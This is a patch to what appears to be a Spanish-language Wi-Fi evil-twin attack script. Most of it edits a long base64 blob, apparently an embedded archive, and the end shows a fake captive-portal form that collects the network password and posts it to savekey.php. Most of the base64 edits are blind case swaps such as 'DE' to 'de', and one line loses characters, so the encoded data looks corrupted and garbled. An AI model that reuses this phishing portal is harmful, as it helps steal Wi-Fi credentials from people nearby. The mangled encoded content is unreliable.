 MnGO1L4DfK8U4HJm6HS5KZYivrMeOu8teBPYWMgKAfx1Ua2bJA+60rj5Strum/lQ66vqOrDNWcst
 A2k0lJCsUZ7Np83iav+MpPbaZFDfphxtGhiLQ1naSOyZtVDQOAPQLdLON0Pm8bZbs413Zh+e4jrR
 k381VC7dYkHfV78pvXMK/JYSpHTzxaK6Phx3gywpXUbltzlP3HcflDkFcylM8rVoQoKVpRnb5eF5
 l8Fyx4XJw/EcRn62LKamPZJ90F0FvnmCf9N3sxztCFjcl0QgXRS1BPFcYuYZjGVBYXFZ+f1LeP6+
 HBU1ZloWGfIblBD+o6qmw+yopGTO/yhf5GP4TzU+GizJBDyDVXiZLytYEZN8iWsxIxHbP8fYmceX
 uLl8XgTUXoufivM/E/Q/SIaMPRpdWPKsDykhXwvQcNaAGtbwFnbPbotv0Quto0c2fRdsoqd+idiY
-EodXv+Vm3YC1c5CQII+nL9BN6V1u0CNo97ckwX3NCQR2SrS2SQQlOU66a0RDEN4+O7YUwin5XvdY
-mrjsVEAlE1B0DqwCerOaE6g42nRAdEMJDhZKsSDwHwc0wmBJDGGMLCCj3V5TRCnGFD7Tn0ka2Cw3
-J53/P5/K75VPJQ4F+6DEKtlqY2aVO7SxIcVKtkrmWDGrNLJ/NU997WMWtUYYWAlwSEbRRuRpTbKS
+EodXv+Vm3YC1c5CQII+nL9BN6V1u0CNo97ckwX3NCQR2SrS2SQQlOU66a0RdeN4+O7YUwin5XvdY
+mrjsVEAlE1B0DqwCerOaE6g42nRAdeMJDhZKsSDwHwc0wmBJDGGMLCCj3V5TRCnGFD7Tn0ka2Cw3
+J53/P5/K75VPJQ4F+6deKtlqY2aVO7SxIcVKtkrmWDGrNLJ/NU997WMWtUYYWAlwSEbRRuRpTbKS
 dfeF1diGz55mzpOf94uFoHaFLaq1zbPyIAvrepBOsSK98fWV9XM4Acr5pAhbZ++uqbw7cbOdiBf7
 TamOuLUg05HwlzZxM8zBHUxWmLAwGCz1XtFCnYvBcWDW09fOiVDnup8NWtZWdAg4YrdW1c0U3dw/
 GTaWrtejgvoDWLkAas0BoVp59nYjrr7XwD3bFKwXzL2D7vs18VvHY/XegiUL5cMUiAZKdTWVJ2x9
@@ -3846,7 +3980,7 @@ wQRk74piLslbEKxsUiwLBF5lTpPolocK4L9yOD5jUvl+Qi8x4siNJTESWowdZdbwD0ytmTFu/gl2
 u+65Obh/TQ5ExrsAS534epAiN0MqN2CF6bviQsI/18HzV9WcH49uhkxrtPFQ0qWfyNcG8xxjccVq
 4MLruPC3BaFKaemrgn2p8AS5pSE1PSXm1ZwEzkRg8UbXiNA1QZ/GDgwNrweP7jtE178ZeyGQlQ2e
 vargKd+J0nMHj+Vb2ByjTKOR6GTimN+Vs3emeO7LF5PTfcyUEpdm481QFBOlTwddJchDoXAF9IEp
-Q7W0FMiQK9kQPfMdMMZpSeJFobTqOLjJ7Cea4jojl4rsC8IAykUHz5R22SgfXdEuIrdHVAM7Hmly
+Q7W0FMiQK9kQPfMdMMZpSeJFobTqOLjJ7Cea4jojl4rsC8IAykUHz5R22SgfXdeuIrdHVAM7Hmly
 Ufx9BfuihsOH7JtiD+OOAcsG8qxRA4UuEoM4X6vfh6nkjpfJn33xx8/oazOUpXEsQW9exUiFrSQX
 UPc66M1CHRpm9/zxgHcOiG82GZ89UwEAyhOxH8/GT/h8bHD5vSKRqQCfYrTN2XRajDGi6sWigtnJ
 l3K71QLWqFMUyDc05R7xLwW3DYN/jki39WohyJ0wVDj4a2Q+hFCMQ6/JHXhdSVAKrpaMd7Amn+HV
@@ -3881,7 +4015,7 @@ jOul5LmhFFsX5Y1RNnz8FRVsuDbAwdbtHgxA1CtRmsqUAvkERNHxGriky0DHWXGE3UiIkWMM03w5
 uipqn97q5RJPV/gvnNi9zHnnwXvWjHvatURAUNSIFpzjdd6JaU2TEWQ/FJfPbjAA7H/A+sYTROiA
 B1HvdX74y5uD+7TygCEXI2jaNmC0IK0XhB/5M4WIGnVPSr6GEm9Yu/B5fAPzaYJ2oYYg4hS+RlUu
 7CVXgnPYMMZFI6aAt5YR3nMtnGpCFZJt9AlfHhpjx7gBxZpozc14wgCBzCReso1I3g0cWHK2Gf7r
-6v0+uCy9U/WWV2sLlkUnzVQttyiGPOWsG11VQDdfyu3tDpHM27l7HHwM9T/R2+APaSA4DeLKowNq
+6v0+uCy9U/WWV2sLlkUnzVQttyiGPOWsG11VQDdfyu3tDpHM27l7HHwM9T/R2+APaSA4KowNq
 M43bDcb8vinFGEmUq1MoeVr+bikaoifqMHdLb6f5+rx4Wlwu8nFhz1UT4G2nNVVbo+FNLXcNPE6C
 CH5hbKZAsFe2UtvahRrSX0iuhoBhCBE06gXAdJtkt6IUWb9my2H26XE/AyX/4ef97Jx/TfBXdus3
 jp/HCIpdUkfY00FacqdQ32FB3efsE1DcGo7K8Y0mLvgVXr3GB2iiMXgwlH8SkVxO+LIBK+NshVhZ
@@ -3955,7 +4089,7 @@ BLrtWrHQnn370DfvJS6G5zNirfETQItIA8OBD5E89i9TxT/aKR0DcFk0gD7x83O8uXTeeI32RIgf
 V6Bbd5wLTj5RP2tYyVmvuASWVOaT6lJMS6y2HGD2UqDwEy/7hOK8keF9yier7RHbDd/7eUxwX88w
 u/YWSy0Hs0rg92DO4EB03krXOERvOSGBiFww8SQN3yEeKFKcslhO1TbWfV/Wqxz29PsascJp1XQZ
 gwMvULdf9gServC6kbwNCd1H184rCrfgM4vADjRS9ax+SlNApb6FgvTNt9wZB5ruLoIJ1w7NRuNi
-Oq+WLKTh1UD6dEwDJ3HyU6u6atgFKLAbtFYcmj/M/VHSQC22OMQ6BmBaujFpHfI0mj0qm4DSHDHQ
+Oq+WLKTh1UD6dewDJ3HyU6u6atgFKLAbtFYcmj/M/VHSQC22OMQ6BmBaujFpHfI0mj0qm4DSHDHQ
 raxl0VBhvU8IHUQXcI7WMxn+PZqe2sG7OEbHHnRINjOBJ/5Nc6VLlx3CFlUZcBOvEVYUdMEeanBG
 4OWyfEpyOizXd8yo0JYnZ1682QlDo8gRfUu+hVrI4abyvIyTiJWc+XBVu/4bSR0lQsfTkBYpthY8
 1w2ZhKai6o38087c1VkxscwQRBhWbjUtNGqNcoKVsyMMs89hyYCeC0X9kreLyW6EvT3ZRbYAcy/c
@@ -3978,7 +4112,7 @@ f3/2VO9R0P3i1CV5g6Jf+T+HxH/9wV0zwFeGiArd1aocE1yTVIy/3a0QkRpqOLXYTrilzqsbvtzh
 4z4uIkIAlaAElL7j9DOGcQ0GtQHHNUjnZ4gVpfnj7Ow+RZormHpmM5Vr/jWqwCUlP/WkxMHx865D
 I2iWoJXk3hukUwK/JV0YKW5nBD7j85NJtw+S0Ok+FnIEhhL77tvoU/JUg/JuFkOntwftX+rFRmsN
 gTcXVPQI6iC9dpfBXIEeWyzibzz677JcTgp6nXGeUmj52QxBH8ecHQ6rEgRgrSH8tb0P4ujmkITD
-enBh0SrlRQ3z5CdKp0B3Ac2AgVV2XANHcBDeMgWLC17KAf1rtmRcsk1UvrWd0pWzmjzSg31PkPqG
+enBh0SrlRQ3z5CdKp0B3Ac2AgVV2XANHcBdeMgWLC17KAf1rtmRcsk1UvrWd0pWzmjzSg31PkPqG
 Juc4doN2Jq+7PQReHWa8POUJkgO/CfbvXhdDbg+J+pNifL6GErrwxXyhMk0bmdlNsp9eei7ObXMd
 QG445BaHLXXJ61dhlS79tU4ekg1f8rIze66FdFIOM2jmC8sEgzF0mArA3lLtueZe4VrWNq8etjRJ
 K74rVfoRSE+kQuUaT3jpBpyEdLW+b5Z+e4tHk9GJwGJKaydz00dKH9pYlsSJcSfKWiGxlowB/ebQ
@@ -3994,7 +4128,7 @@ rBp6i0HumPTe3z+lM97zFfS7Yk1Z77NApaNbX9eXZgpzd5cEigq9CEPx9oIod5cPiiqiuo23hqBQ
 Q03y5R6X0Dx0eJsQPklnpvvLq2c/mErc/3b49uWLx0+eHYgy6NfOuBiBUPMN3gm4yyJLDGRpr9w4
 PA6to0FAdmt46ou5XvmXVKhy7EHioG3VDxcFYsA6u4B2M/BruHtXnFbzIX0Jbp/8fpBONOIkZdU+
 JWe6TOwTCvHRV+c3Y6Wf5mtmAjZ0Jh8tV8STXPK0ESICzTICmV92TEfsXhH/CGQ3xNDLZTE1ewaf
-6fhJPu97+dwJurKjBCi8LVvOXpDER+elLfTTvffuyu+nFXB7XGcOaRXHkugEuXb+1l4Qf2rvBnm/
+6fhJPu97+dwJurKjBCi8LVvOXpdeR+elLfTTvffuyu+nFXB7XGcOaRXHkugEuXb+1l4Qf2rvBnm/
 n0Sd8He4QKUhTGdvYDJd97MBGekORV04wGYUhD7Fffzi4POlunD5W/JLcYPQrOhSlqJYJ2Nl+A12
 r8WpQF+HNyuugy9o2i+YomYgtuukUMInyqddXdJDBdKJTB+D4u+Efs7NHQhIqR8oQz37VPQoTHAG
 LLq2gmHTHTTKhz49umnXDVA7YDSNr7J7caGh7MJGB+hIRh2K0224RueTImrXM8SmUiMLTk4yIShS
@@ -4040,7 +4174,7 @@ VRkIM86vQafzdalTtXffv9RwVn/h6EK65Pqdf/+lGmuX95Z8xSO1CIvQl/lsdAWDaJJI0uL1sv18
 hOVkaqIN/pU5zYQe9041KoVSZrDoPIOa/5JPCxBZv6uuXWZVtmxKXda0KRPzncTwSC2hT+M+MV4/
 SO6F+wr7oYsmtjaIfWQT7SelqXlPPohIbbdRHz+pl2p62f6x7DPdyTt8oDdz+NHhw9QHu02wI9GB
 qUK3bFSHEMqXcyQ9dfXEVmbjFZnFxwSBKKjDSuSjSjZSwb1emmtMFo4QDFu+M5GcsV3DT3TzgApM
-4inmEPsMnV04V16TCyi34H59wgBYSHY+UHcySfGDlzu+phVmNazEu49AkWKQQDE2CZPBu79pvnjn
+4inmEPsMnV04V16TCyi34H59wgBYSHY+UHcySfGDlzu+phVmNazEu49AkWKQQde2CZPBu79pvnjn
 b3fpKgmOL9aoCPDP+hXn0EAxmdidQC6+p6eOP1021m7M2QPDkEJvo+TbPAKsk6Oabpwb0pZ2vGnO
 7tsBin6mpMo6te2UcMHBfFVf9eIwpNiDIuwd8yhDcQrmZ17n6g9FH/ZeDYUcci9JrndjxmzhKshU
 At1XKOaMVr4nzYFqITM0MrcF5N4nI6gW3e8joSOdt/lRFkga/dLr5y1FRcTou1+hRt/cWuZ6K13l
@@ -4070,7 +4204,7 @@ Ws4niFG8psTl9Mk3DAzeJwUsh4MMYw4whcn0kErSeChTSaYpP5xcV9vOUW1XVfXOhwXSqYvJTMop
 YjSAwEDnq+35fjA+/LwWhHOGnefuCto5ceq+D+qgyrFaR2p8oAGM8A11E5ErSjTtmvp8jKKjDIsI
 PumKHSmli+LMK0C5+w0Uw98IkWcqsK3eBStPVT/WO1jt2Kp13PeXHAgosWuXf6VNgOCBNeUDLGea
 lRLjRnLcy6Cv1pLai8gPsil7r8dh5ja2CX+CFvGMx4raaE+KqNe00zGKidPUXqMl6g39997p/v4b
-qYglyZjJorA9GhWYeJBQujEdTRVmN2NGHFz0Y93WuTZCCxW36DGXwoeDenXOKTuMOFREJtLIphXI
+qYglyZjJorA9GhWYeJBQujEdTRVmN2NGHFz0Y93WuTZCCxW36DGXwoedenXOKTuMOFREJtLIphXI
 eemyZLTqZ9zSpoLFzRzOBOt0TIWD+WYZAue06SyBY0g5kWxtzZqdb9NNaCjJB7dhR6QCMU85rCT6
 w5+QcGQqusDs3WHJCWD7WaSsIkzM/kHi8c/1vviAR8IWVsfaTgqkcvOuSyn7lFJ0WVWT83yRUvab
 Kr4cjN/P0Ib08goFLKe/iy0H3/xHVU1b8kF2SXyA1o6OBH0Y6YD0HcN/6WXW43+m+ZzOMfrFobv0
@@ -4081,7 +4215,7 @@ srVGXviKZ9OZXIT9fC1pcjHohZbIveynAv7X5+AwOIUvq8FAc3D9COxpsVzNKFtNP3M5aGm8dCpV
 Zv5kndkQKedOiKcAbC7UUGBwmHKWU4ZJntq6L0HjI0pfMsHcEOxLuKje4Tl8A6pdiaE/2pVXGBtJ
 iNo4Vh06BVXWHB81h44AD6/OgcJ1yakrSPzBdGh4s4xBJxyF+TPHPrhklJQ+jbz3VO1nb15tO0iF
 63x6YRzv2TS9WE0oVR6ngeDrl4UbK59472YYGE3dPwy7jyllXUsMlJ9LeKiaHyblu4Ky7pC4RHA3
-F0WBUYoFXyRMMY6wwK2I7nDXmNhajOXiBGs2WNu1jvGYpW6+qHzSbjFutZn5dECn+/Tldhufty1E
+F0WBUYoFXyRMMY6wwK2I7nDXmNhajOXiBGs2WNu1jvGYpW6+qHzSbjFutZn5deCn+/Tldhufty1E
 bnSV3hQHXnRsC6xNOhB+vjxnjCiyWpUJA65glyLfRkc4/skucMQr5GLq/lycztH4lQKudda5b3jP
 6I6FCRSaodzg1KlqEJPdxDoxdhIb8fX2z8RRsImjaWnrPshkuA+6zOJsv7qe6XZdnmyzzkzXfEnX
 pW2tmbqlw0SxOKctPCJjg36ZpT69lR6fXRCf8gX6dMXDUDK6d/GYoZTbdMycV0sMhJ0ztyWJB5jO
@@ -4101,8 +4235,8 @@ W3cS6bssfLOBwmosaWYdKipiaDjJbrUxGby6PmnarDyjx9X5z3yVQinpOGcbtDGqpqTFc2yksLSM
 edogoyPmXMRBR14Um+kvD0nszXjupfjah3wGN1G7UrnH0YTyORO6KwtDrqs30L1PVYf5nTDRRR3c
 jIJM/8oY+vzagUlwz4MVBCy/LVa8bXVJiCbHQTejr4uJj6aGLoeR1PPgXZJS0Rfos4ratf9Q+3pZ
 YBimC/TUD367ncCm/8zuBaQT77Jemxrm0s8lXhk1TKth5tNTnZX0Ku0POhe3bRF4J7PwKHP0PnBo
-12GFMqodK3yQRRT/Mpu7cGvfFjXkN0GzSi7g12YdinitKxJF1yeiSaJez9oNPB2r5TaxMBuJxION
-0GjMmEKYYJFvBpr3KHum64sDePE2h9Lj1Q6cSvOkwqvhZeHuATJzVOGCtA3tl7P96AC6VUOHMdYE
+12GFMqodK3yQRRT/Mpu7cGvfFjXkN0GzSi7g12YdinitKxJF1yeiSaJez9oNPB2r5deltaxMBuJxION
+0GjMmEKYYJFvBpr3KHum64sdePE2h9Lj1Q6cSvOkwqvhZeHuATJzVOGCtA3tl7P96AC6VUOHMdYE
 fTNdim/Y9cbcx5gw5a8iMfR3pXxfzQnqWp+LIcG3AXrvaoGoreZZLZe1FJX+HoTIQoxBEo7j7hzQ
 1HqdL9gRC/5WI0OX8KYfxMeIGZk1UsA213ZooztrmksjeecV41eC61USMmjHdRItE1+7mfCwYt/s
 9iV09+qS68p7T9DCWsoVT0pve52FHyOjpalAew8Kc9mbwA7WNJOldevfaESmvISobfY5RSGqaAp/
@@ -4117,11 +4251,11 @@ s3pdY6CZa0Nd+DJyaKqju8g+coVDQcbn21CZVrwhhPUOWl65xD3pKsw8gyln0FY+FhyWC88kLaq6
 l9D0aLJcyyWpw/5mTN7cd5VWXa41OUx60L5rDbZThzDoW74gLFf6qFxKPmEBzOVlaPQxn9OC1pcn
 rIlHbbLzPe0oObspBGtNydrJ5Rt1H74eLjQwibzFfl5NBQw3n3GPieNohaMJsB2X5dadKjbIXA8d
 OpJaM+IaRo4npIV47qPr9YmuTonPSpMFxQ2kSposR0fbB5bRiLxPHM4mlBmhbxY78mH3BhvGzwbp
-k9RchODUnlq7UsaGUSYoEx58Rr5oDej7DXaUE3d7m1Zk76zid52hIBb7uxGvzCJOmZn3XqszhfxD
+k9RchODUnlq7UsaGUSYoEx58Rr5odej7DXaUE3d7m1Zk76zid52hIBb7uxGvzCJOmZn3XqszhfxD
 9DSAGUVnH+/L4xx8YrnfdCg9yEY36SI27is9jDsclAx6HRSPb5XRJnQrDrn5im6NJxeH6K6g7qCJ
 ALaOl4B283PkFETPXvzw7MnjV8+eItkeDh4OrQsA5zH1/TtFRvMPPg4qA/+tt4zWbkZw5Qp3Dj2v
 l2hPvK4W72r2vLkuCCBhOsXAHYN0HgSVBnwcAdSAFO+FcbKvd3D2eltwQFSv3RjzrHVMM/6oqmhZ
-75C+bYNd8JzJxTdEkXXJHoSBLnJNv7kbLW6x3iH2LkF4d3DLs8/7sk5aI9uC2BXhWfwI55mPvDqM
+75C+bYNd8JzJxTdekXXJHoSBLnJNv7kbLW6x3iH2LkF4d3DLs8/7sk5aI9uC2BXhWfwI55mPvDqM
 xwbBg5KiEzq4nL54JKHqqvAWi9WMtGf0r/X1UE/M7xYsq1WOqRM4dVa1GCA+8uNLx/Dmk3xJopMt
 ow+dqv8DQk6TexXIZriOYT3/RBfBnI9vlM/Jb2aa/wybRLpOH1+/A/V3hI74q3xAf/ayIwyCK+D7
 P5fLvx31Xh8f/rc3Dw6O1Ex9/U7HfgqHmlYAJ5z8+Tp7qAhRZNBG/41EwB13Xe31Va0555FiAtdP
@@ -4136,7 +4270,7 @@ WkBu0SujkB4q7opzQqJBEOtwJh5OBEIhPmp26MWtPso+oTsKqy5Hxq94NkIj2G10zJJxKzICZR99
 kzIcWcVWkm0LBwC0PK+ryQq9uDPr/oWcZpaXEzLvMLwrklNNGegiPkF4KBpCaNgQb3wgzTn6GJes
 wr/PoPGOnqAuXnpS0kV3dsheYIc0BjzBhvQXwtJ8Ou4d9+H/QEWDrpIL9VXpukCq5/sK9b95hQTH
 AGqxx5US6cbN6tlI53Y9quYFV0RD4Fx1yBeBCQnzP/zkBhUNtxETLLhNYIudAr26E8MZh20ZV9N+
-+yJDS+Onn34hzoOyP5QebPPz7unqV4DHLZyPuIxk6fh1xS73aFolutJFuKy1hxjkN/W+73hpTiDE
++yJDS+Onn34hzoOyP5QebPPz7unqV4DHLZyPuIxk6fh1xS73aFolutJFuKy1hxjkN/W+73hpTide
 nOr3quS4LYqwq9ylMXXMRcPWAzsWtCn5AeHVftVYo5JxCSOOxFNSvB8eziljpzpDiP4i5lmKqXc5
 ndAGxKs1x6BS3NFdrovNx/6EC/ig54E9ilyQjCrX+RrNXMiDOCWslDtgRh0wjhYOLZ3+mjsb+U0Y
 lfiQYeaa6n/gQcGcUrFYJBkRtk6hGiUaZlPsXCit86k6286N9wls0g7kAUapZQ+6cw/iQyYi1l15
@@ -4146,7 +4280,7 @@ TFhhQtZk/PHZcnIXiJqmdkwxVS3RakGwmuDMSeQafTYUIxHV4J5+TykS3BsTp0W/CTp9bAtwDgZT
 hPipLSH+R67AGePH+AKEqyIQN9U4tz3TeDHzNu5hM6JsTm5bZogwQcE45bWtSYuYaoTn/7TI58GA
 +fEhYsM0Csads4XTVScoar+x5JUXRGDx8kx9x2ZDZzNp+bKtp8HXzS7bKtq7HlZix8AX74X9SB5J
 9JIponF9lJAAvhhRFf6A7GLyUnomayAEUYKHIK0Am+jyRRDFWeajUTFf1nI3BJxnVV/1NXansw1T
-iTqMXpsdSrI651QCvkntm+wBskB2mG295bX/dKiGkbdElu/K2Tv/aO4iX/CXbAb/0m8efYZrZG4f
+iTqMXpsdSrI651QCvkntm+wBskB2mG295bX/dKiGkbu/K2Tv/aO4iX/CXbAb/0m8efYZrZG4f
 XASLg592Wi1jqYv8lhv7ZLBWgzyXBblz0ReIFIEi9SvKJ3Haotku5e19gR7DOl4fv+krj3sh5u0g
 O4UJIKParbfMeTVeM7QcFT2xymT0hZERubNK4Nbezm0RpIXNGWK9HwYO/tR/4dRotAf75y1pQ5pt
 OaSTAwKmeozZBvcNBFd3f4dOPMj2u9nRo33KrsF5ZhJat2k8ItJPvOJaKXTt3s9tao1W+hhWGBJI
@@ -4211,7 +4345,7 @@ YmPqWxEcDqw665pT+FKuMG1kD1gYxevox0aNaF/oKGV0v5zk58Xk0ZeMGYz8AIiNPl3n1c0+e3fB
 sXZEK8sPApHHKawYlhZXYLIj+CRRNL363Asex+5ZU6oRAvqPuCuLfFxWPRXTBNOhahxrIqIlLkOh
 7/sf7es63M/8civfo+JBr7IH+wf7ByxM7RNF9s2E7VPX9n0frVXnlnnAFpITRSyFhFEKZ0L47ZLg
 4QhKnuuZqK81pQ3GTtUgNyMrHWaMTYNpmDVOlgNjv5KeyAZLyGSWjdJyTVKHEpsYOsZfYfW7cVX7
-pXiB0yDx6KNBxYfdr509k9hDF+KBm83W7dS01MlhDe89HnLkdGWKCC6dA9uJVtGHtesrbW84xGpW
+pXiB0yDx6KNBxYfdr509k9hDF+KBm83W7dS01Mlhde89HnLkdGWKCC6dA9uJVtGHtesrbW84xGpW
 L+bwXCHrUzmrQVXn7IR6GIthioHfnueLd6t5T2XvYLOo8Ggke16F26qmQj2zVGWGZckJfxUNwV7F
 NqZflBWeduW/0Qe0nuzUB6qELoc0U3YzQvqP3JLKBS+uR3LA8ITvekO8SEZ2/VpQqvaW3KTuJ+dd
 EwTd3m1FtdXKK2XfeHVYe4LlmHYfnnTUZRZnPUbXpD0ZB/yIlimTSqvFPOixZnRn8+CO2hH0fFJd
@@ -4231,11 +4365,11 @@ Pl9nX2Z/xKe/0B/0BF/RXOInn1MIZhDlZDJ8m7uGIEO82bq3e9794l7yU5sx/EB9nTqJbCmKQYIP
 I1cIbIq9+1fLqQLC4J/OhkNnnjwvcocadV+YWCPRLvMpVv8yJDQCYJ+v4NwQXKAepVWeo+fNTLCW
 8aJUU2IfmD2HIoPLzMHSjyjQ2MWmjimi3EI/6VqpSKGJ/RIQ0esQIcgvViAIVdU7zkOApL6krG9u
 eJnAhCPqMiqEuInW+/Av45c7rICB8Ubw7ntm3TnZSNPuQGtjRn7uCKaS4F83CvTqA5TSZvtL1DP7
-2aTICY6XukW3ZsWaxLjDR1mened1OYLJpl2FMBUFrqQRSsLo+IHOaNdlDeIrKAMjjGd0yONyASSI
-zLz7PHgGKFPFY4fvELBXrBdEugXCnyNiiO4azG7o4M5J/KTAyXczzNOE1J6UmEqNOnCVgxoNCxiO
+2aTICY6XukW3ZsWaxLjDR1mened1OYLJpl2FMBUFrqQRSsLo+IHOaNdldeIrKAMjjGd0yONyASSI
+zLz7PHgGKFPFY4fvELBXrBdeugXCnyNiiO4azG7o4M5J/KTAyXczzNOE1J6UmEqNOnCVgxoNCxiO
 k7XcsTFhYGIu0fZDV5yYvAJmYokyBIEtS8aTRXG5mmDm1+VyTnOJSXkUjpqkazgxe19//Xk/+x4I
 kmfPYVIO1ELkwq+h7yY3ZRYcOnZg/pyR4T8ej2WF9d3qn1SwhbpmVaqGRhBZo2eTjizo0Boi665t
-XXtxAFHMsR+Tc+jxAM+AfLbm8/2ygmauF4jp3/u3lxlMTYUeAsVydECX/ZL6YVzhmsIcfLw4iIFo
+XXtxAFHMsR+Tc+jxAM+AfLbm8/2ygmauF4jp3/u3lxlMTYUeAsVydeCX/ZL6YVzhmsIcfLw4iIFo
 KicGxNb8OLyJCUAbd99YInM/h/2B67QmGURB3qMkCXgaMghWJwgYaO7zfvb58fExD9OD2ukUMLAd
 9PNC89vJinVBze5eeSwpO03qW8Gq9mwHY3VlrkDPf0HQdrFfjDamfIsa6ewphhMiIWbGoWh5ZYBV
 RXFJA+T1s+jxGLpRXXrkvD3aEKfUyKAGljL/Nkc/HP+buP6LfJFP6x49JaXgu2qU8wgQGuHqwFYn
@@ -4403,7 +4537,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA=
 	
 		<div data-role=\"content\">
 		<fieldset>
-		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-asix=\"false\" action=\"savekey.php\" method=\"POST\" >
+		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"savekey.php\" method=\"POST\" >
 	<div class=ui-grid-c>
 	
 	      <div class=ui-block-a>ESSID:</div>
@@ -4454,6 +4588,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA=
 	">$DUMP_PATH/data/index.htm
 	
 }
+######################################### < INTERFACES WEB > ########################################
+
 
 mostrarheader && setresolution && setinterface
-
